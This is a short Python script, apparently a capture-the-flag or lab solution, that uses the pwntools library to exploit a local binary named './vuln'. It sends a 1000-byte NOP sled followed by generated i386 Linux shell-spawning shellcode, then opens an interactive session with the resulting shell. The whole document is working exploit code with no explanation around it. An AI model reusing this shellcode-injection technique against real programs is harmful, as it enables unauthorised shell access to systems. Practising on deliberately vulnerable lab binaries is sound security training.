#!/usr/bin/env python

from pwn import *

p = process('./vuln')
e = ELF('./vuln')

sled = '\x90'*1000
p.sendlineafter('\n', sled + asm(shellcraft.i386.linux.sh()))
p.interactive()
